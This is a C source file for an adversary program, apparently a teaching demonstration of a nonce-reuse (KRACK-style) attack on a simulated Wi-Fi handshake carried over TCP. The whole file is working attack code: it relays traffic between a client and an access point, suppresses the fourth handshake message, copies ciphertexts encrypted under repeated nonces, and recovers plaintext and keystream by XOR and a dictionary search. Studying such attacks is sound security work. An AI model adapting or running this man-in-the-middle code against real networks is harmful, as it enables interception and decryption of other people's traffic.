#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <net/if.h>        //for struct ifreq
#include <pthread.h>

#define MAXMSGSIZE 256
#define DATASIZE 16
#define GROUPNUM 3 //group number of ciphertext encrypted with the same Nonce
#define SECTIONSIZE 48 //16*3=48, see every 3 successive 16-bytes ciphertext as a section (encrypted by Nonce = 0,1,2 respectively)

char recvBuf[MAXMSGSIZE+1]; //receive message buffer for client(send message buffer to AP)
char recvBuf_[MAXMSGSIZE+1]; //receive message buffer for AP(send message buffer to client)
int clientSocket;  //real client socket
int adCSocket; //adversary's client socket

//groups of ciphertext encrypted with the same Nonce
char M_Nonce0 [GROUPNUM][DATASIZE+1]={0};
char M_Nonce1 [GROUPNUM][DATASIZE+1]={0};
char M_Nonce2 [GROUPNUM][DATASIZE+1]={0};

char stream[SECTIONSIZE+1] = { 0 };
char p1[SECTIONSIZE+1] = { 0 };
char p2[SECTIONSIZE+1] = { 0 };
char keystream[SECTIONSIZE+1] = { 0 };
char c1[SECTIONSIZE+1]={0};
char c2[SECTIONSIZE+1]={0};
char c3[SECTIONSIZE+1]={0}; //used for verifying
int k;
int countnum;
int q;

//function for receiving message from real client
void recvMsgfromclient()
{
	int n;
	memset(recvBuf,'\0',sizeof(recvBuf)-1);
	if((n=recv(clientSocket,recvBuf,MAXMSGSIZE,0))==-1)
	{
	    printf("recv msg from client error: %s(errno: %d)\n", strerror(errno), errno);
   	    exit(0);
	}
	//printf("%d\n",n);
	recvBuf[n+1]='\0';
	printf("recv msg from client: %s\n",recvBuf);
}

//function for sending message to AP
void sendMsgtoAP()
{
    if(send(adCSocket, recvBuf, strlen(recvBuf)+1, 0) < 0)	
    {
	printf("send msg to ap error: %s(errno: %d)\n", strerror(errno), errno);
	return;
    }
    printf("      send msg to AP: %s\n",recvBuf);

}

//function for receiving message from AP
void recvMsgfromAP()
{
	int n;
	memset(recvBuf_,'\0',sizeof(recvBuf_)-1);
	if((n=recv(adCSocket,recvBuf_,MAXMSGSIZE,0))==-1)
	{
	    printf("recv msg from ap error: %s(errno: %d)\n", strerror(errno), errno);
   	    exit(0);
	}
	recvBuf_[n-1]='\0';
	printf("    recv msg from AP: %s\n",recvBuf_);
}

//function for sending message to real client
void sendMsgtoclient()
{
    if(send(clientSocket, recvBuf_, strlen(recvBuf_)+1, 0) < 0)	
    {
	printf("send msg to client error: %s(errno: %d)\n", strerror(errno), errno);
	return;
    }
    printf("  send msg to client: %s\n",recvBuf_);

}

//thread 1 for listening real client
void *listenClient(void)
{
	char *done="Done!";
	char *msg4="Finish_Handshake"; // msg4 signal
	char tmp[17]={0};
	int group0=0;
	int group1=0;
	int group2=0;
	int f1=0; //a flag(the next 16-bytes receive data is encrypted with Nonce 1)
 	int f2=0; //a flag(the next 16-bytes receive data is encrypted with Nonce 2)
	
	while(1)
	{
		recvMsgfromclient();
		memcpy(tmp,recvBuf,strlen(msg4));
		if((strcmp(tmp,msg4)==0)&&(group0<GROUPNUM)) // capture msg4 and lose it
		{
			recvMsgfromclient(); //continue listening the next packet(16-bytes ciphertext encrypted with Nonce 0)
			memcpy(M_Nonce0[group0],recvBuf,DATASIZE); //steal
			//printf("M%d: %s\n",group,M_Nonce0[group]);
			sendMsgtoAP();
			group0++;
			f1=1;
		}
		else if((f1==1)&&(group1<GROUPNUM)) 
		{
			f1=0;
			memcpy(M_Nonce1[group1],recvBuf,DATASIZE); //steal
			//printf("M%d: %s\n",group,M_Nonce0[group]);
			sendMsgtoAP();
			group1++;
			f2=1;
		}
		else if((f2==1)&&(group2<GROUPNUM)) 
		{
			f2=0;
			memcpy(M_Nonce2[group2],recvBuf,DATASIZE); //steal
			//printf("M%d: %s\n",group,M_Nonce0[group]);
			sendMsgtoAP();
			group2++;
		}
		else
		{
			sendMsgtoAP();
		}	

		//after receiving and sending the last packet from client, exit 
		printf("-----------------------------------------------------\n");
		if(strcmp(done,recvBuf)==0)		
		{
			break;
		}
	}
}

//thread 2 for listening real AP
void *listenAP(void)
{
	char *done="Done!";
	while(1)
	{
		recvMsgfromAP();
		if(strcmp(done,recvBuf_)==0)		
		{
			break;
		}
		sendMsgtoclient();
		printf("-----------------------------------------------------\n");
	}
}

//intercept and forward messages
//the first parameter is used for real client with adversary's server
//the second parameter is used for adversary's client with real AP
void msgForward()
{
	pthread_t id1,id2;
	int res;

	//listen real client
	res=pthread_create(&id1,NULL,(void *)listenClient,NULL);
	if(res) printf("Thread1 create error!\n");

	//listen real AP
	res=pthread_create(&id2,NULL,(void *)listenAP,NULL);
	if(res) printf("Thread2 create error!\n");

	/*When client has transimitted data, adversary can stop listening because it has stolen relavent data,
	so adversary don't need to wait the thread2 stop!*/
	pthread_join(id1,NULL);
	//pthread_join(id2,NULL);

	printf("Finish listening!\n");
	printf("-----------------------------------------------------\n");

}

void getEncryptedData()
{
	int i;
	
	printf("Nonce=0 encrypted data:\n");
	for(i=0;i<GROUPNUM;i++) printf("%s\n",M_Nonce0[i]);
	printf("-----------------------------------------------------\n");
	printf("Nonce=1 encrypted data:\n");
	for(i=0;i<GROUPNUM;i++) printf("%s\n",M_Nonce1[i]);
	printf("-----------------------------------------------------\n");
	printf("Nonce=2 encrypted data:\n");
	for(i=0;i<GROUPNUM;i++) printf("%s\n",M_Nonce2[i]);
	printf("-----------------------------------------------------\n");
	
	return ;
}

//judge whether x is a legal letter
int islegal(char x)
{
	int t;
	if (x == 'P' || x == 'O' || x == 'S' || x == 'T' || x == 'G' || x == 'E' || x == 'H' || x == 'I' || x == 'N' || x == 'U') t = 1;
	else t = 0;

	return t;
}

int filter()
{
	int i;
	
	for(i=0;i<SECTIONSIZE;i++)
	{
		if(p2[i]=='I'&&(i<(SECTIONSIZE-strlen("INPUT"))))
		{
			if(p2[i+1]!='N'||p2[i+2]!='P'||p2[i+3]!='U'||p2[i+4]!='T') return 0;
			else  continue;
		}
		
		if(p2[i]=='H'&&(i<(SECTIONSIZE-strlen("HTTP"))))
		{
			if(p2[i+1]!='T'||p2[i+2]!='T'||p2[i+3]!='P') return 0;
			else  continue;
		}
		
		if(p2[i]=='G'&&(i<(SECTIONSIZE-strlen("GET"))))
		{
			if(p2[i+1]!='E'||p2[i+2]!='T') return 0;
			else continue;
		}
		
		if(p2[i]=='S'&&(i<(SECTIONSIZE-strlen("ST")&&(i>=strlen("PO")))))
		{
			if(p2[i-2]!='P'||p2[i-1]!='O'||p2[i+1]!='T') return 0;
			else continue;
		}
	}
	
	return 1;
}

int dictionary(int start)
{
	//printf("%d\n", start);
	int count = 0;
	if (start == SECTIONSIZE) //recursive export
	{
		if(filter()) //check whether p2 is semantic(filter some p2)
		{
			printf("\npossible plaintext combination (1-%d bytes + %d-%d bytes)：\n",SECTIONSIZE,(SECTIONSIZE+1),(2*SECTIONSIZE));
			printf("%s + %s\n",p1,p2);
			printf("\nat this time keystream is：\n");
			for(q=0;q<SECTIONSIZE;q++) keystream[q]=c1[q]^p1[q];
			printf("%s\n",keystream);
			printf("----------------------------------------------------------------------------------------------------------\n");
		}
		return 1;
	}
	else if (start < SECTIONSIZE && start >(SECTIONSIZE - strlen("output"))) //maybe not an intact word, so judge by single letter
	{
		if (islegal('P'^stream[start]))
		{
			p1[start] = 'P';
			p2[start] = 'P'^stream[start];
			countnum = dictionary(start + 1);
			if (countnum) count += countnum;
		}

		if (islegal('O'^stream[start]))
		{
			p1[start] = 'O';
			p2[start] = 'O'^stream[start];
			countnum = dictionary(start + 1);
			if (countnum) count += countnum;
		}

		if (islegal('S'^stream[start]))
		{
			p1[start] = 'S';
			p2[start] = 'S'^stream[start];
			countnum = dictionary(start + 1);
			if (countnum) count += countnum;
		}

		if (islegal('T'^stream[start]))
		{
			p1[start] = 'T';
			p2[start] = 'T'^stream[start];
			countnum = dictionary(start + 1);
			if (countnum) count += countnum;
		}

		if (islegal('G'^stream[start]))
		{
			p1[start] = 'G';
			p2[start] = 'G'^stream[start];
			countnum = dictionary(start + 1);
			if (countnum) count += countnum;
		}

		if (islegal('E'^stream[start]))
		{
			p1[start] = 'E';
			p2[start] = 'E'^stream[start];
			countnum = dictionary(start + 1);
			if (countnum) count += countnum;
		}

		if (islegal('H'^stream[start]))
		{
			p1[start] = 'H';
			p2[start] = 'H'^stream[start];
			countnum = dictionary(start + 1);
			if (countnum) count += countnum;
		}

		if (islegal('I'^stream[start]))
		{
			p1[start] = 'I';
			p2[start] = 'I'^stream[start];
			countnum = dictionary(start + 1);
			if (countnum) count += countnum;
		}

		if (islegal('N'^stream[start]))
		{
			p1[start] = 'N';
			p2[start] = 'N'^stream[start];
			countnum = dictionary(start + 1);
			if (countnum) count += countnum;
		}

		if (islegal('U'^stream[start]))
		{
			p1[start] = 'U';
			p2[start] = 'U'^stream[start];
			countnum = dictionary(start + 1);
			if (countnum) count += countnum;
		}
	} 
	else
	{
		//maybe "HTTP"
		if (islegal('H'^stream[start]) && islegal('T'^stream[start + 1]) && islegal('T'^stream[start + 2]) && islegal('P'^stream[start + 3]))
		{
			p1[start] = 'H';
			p1[start + 1] = 'T';
			p1[start + 2] = 'T';
			p1[start + 3] = 'P';
			p2[start] = 'H'^stream[start];
			p2[start + 1] = 'T'^stream[start + 1];
			p2[start + 2] = 'T'^stream[start + 2];
			p2[start + 3] = 'P'^stream[start + 3];
			countnum = dictionary(start + 4);
			if (countnum) count += countnum;
		}
		//maybe "POST"
		if (islegal('P'^stream[start]) && islegal('O'^stream[start + 1]) && islegal('S'^stream[start + 2]) && islegal('T'^stream[start + 3]))
		{
			p1[start] = 'P';
			p1[start + 1] = 'O';
			p1[start + 2] = 'S';
			p1[start + 3] = 'T';
			p2[start] = 'P'^stream[start];
			p2[start + 1] = 'O'^stream[start + 1];
			p2[start + 2] = 'S'^stream[start + 2];
			p2[start + 3] = 'T'^stream[start + 3];
			countnum = dictionary(start + 4);
			if (countnum) count += countnum;
		}
		//maybe "GET"
		if (islegal('G'^stream[start]) && islegal('E'^stream[start + 1]) && islegal('T'^stream[start + 2]))
		{
			p1[start] = 'G';
			p1[start + 1] = 'E';
			p1[start + 2] = 'T';
			p2[start] = 'G'^stream[start];
			p2[start + 1] = 'E'^stream[start + 1];
			p2[start + 2] = 'T'^stream[start + 2];
			countnum = dictionary(start + 3);
			if (countnum) count += countnum;
		}
		//maybe "INPUT"
		if (islegal('I'^stream[start]) && islegal('N'^stream[start + 1]) && islegal('P'^stream[start + 2]) && islegal('U'^stream[start + 3]) && islegal('T'^stream[start + 4]))
		{
			p1[start] = 'I';
			p1[start + 1] = 'N';
			p1[start + 2] = 'P';
			p1[start + 3] = 'U';
			p1[start + 4] = 'T';
			p2[start] = 'I'^stream[start];
			p2[start + 1] = 'N'^stream[start + 1];
			p2[start + 2] = 'P'^stream[start + 2];
			p2[start + 3] = 'U'^stream[start + 3];
			p2[start + 4] = 'T'^stream[start + 4];
			countnum = dictionary(start + 5);
			if (countnum) count += countnum;
		}
		//maybe "OUTPUT"
		if (islegal('O'^stream[start]) && islegal('U'^stream[start + 1]) && islegal('T'^stream[start + 2]) && islegal('P'^stream[start + 3]) && islegal('U'^stream[start + 4]) && islegal('T'^stream[start + 5]))
		{
			p1[start] = 'O';
			p1[start + 1] = 'U';
			p1[start + 2] = 'T';
			p1[start + 3] = 'P';
			p1[start + 4] = 'U';
			p1[start + 5] = 'T';
			p2[start] = 'O'^stream[start];
			p2[start + 1] = 'U'^stream[start + 1];
			p2[start + 2] = 'T'^stream[start + 2];
			p2[start + 3] = 'P'^stream[start + 3];
			p2[start + 4] = 'U'^stream[start + 4];
			p2[start + 5] = 'T'^stream[start + 5];
			countnum = dictionary(start + 6);
			if (countnum) count += countnum;
		}
	}
	return count;
}

//crack the plaintext and streamkey
void crack()
{
	int j;

	for(j=0;j<DATASIZE;j++){c1[j]=M_Nonce0[0][j];c2[j]=M_Nonce0[1][j];}
	for(j=DATASIZE;j<(2*DATASIZE);j++){c1[j]=M_Nonce1[0][j-DATASIZE];c2[j]=M_Nonce1[1][j-DATASIZE];}
	for(j=(2*DATASIZE);j<(3*DATASIZE);j++){c1[j]=M_Nonce2[0][j-(2*DATASIZE)];c2[j]=M_Nonce2[1][j-(2*DATASIZE)];}

	//printf("c1: %s\n",c1);
	//printf("c2: %s\n",c2);

	int i;
	for (i = 0; i<strlen(c1); i++) stream[i] = c1[i] ^ c2[i]; //just like M1⊕Hash(TK||0)⊕M4⊕Hash(TK||0) = M1 ⊕ M2 
	
	printf("----------------------------------------------------------------------------------------------------------\n");
	int tmp=dictionary(0);
	printf("----------------------------------------------------------------------------------------------------------\n");
}

int main(int argc, char *argv[])
{
	//build a server to listen the client
	int adSSocket; //adversary's server socket
	struct sockaddr_in adSAddr;//server network address structure
	struct sockaddr_in clientAddr;//client network address structure

	memset(&adSAddr,0,sizeof(adSAddr));//initialize
    adSAddr.sin_family=AF_INET;//set as IP communication
    adSAddr.sin_addr.s_addr=htonl(INADDR_ANY);//server IP is all local IP
    adSAddr.sin_port=htons(atoi(argv[3])); //listen client port
	
	//create adversary's server socket
    if((adSSocket=socket(PF_INET,SOCK_STREAM,0))<0)
    {
		perror("server socket create error");
        return 1;
    }

    	//bind the server socket
   	 if(bind(adSSocket,(struct sockaddr *)&adSAddr,sizeof(struct sockaddr))<0)
    {
		perror("server socket bind error");
		return 1;
    }

	//listen connection(the quene length is 5)
    if(listen(adSSocket,5)<0)
   	{
		perror("server socket listen error");
		return 1;
    }

	//accept client connection request
    int sin_size=sizeof(struct sockaddr_in);
    if((clientSocket=accept(adSSocket,(struct sockaddr *)&clientAddr,&sin_size))<0)
    {
    	perror("server socket accept error");
		return 1;
    }	
    printf("Accept client %s\n",inet_ntoa(clientAddr.sin_addr));

	//build a adversary's client to request AP
	struct sockaddr_in apAddr; //AP network address structure
	memset(&apAddr,0,sizeof(apAddr)); //initialize
	apAddr.sin_family=AF_INET; //set as IP communication
	apAddr.sin_addr.s_addr=inet_addr(argv[1]);//AP IP address
	apAddr.sin_port=htons(atoi(argv[2])); //AP port
	
	//create adversary's client socket
	if((adCSocket=socket(PF_INET,SOCK_STREAM,0))<0)
	{
		perror("client socket create error");
		return 1;
	}
	
	//connect adversary's client socket to AP socket network address
	if(connect(adCSocket,(struct sockaddr *)&apAddr,sizeof(struct sockaddr))<0)
	{
		perror("Adversary's client socket connect error");
		return 1;
	}
	printf("connected to AP\n");

	msgForward();
	getEncryptedData();
	crack();

}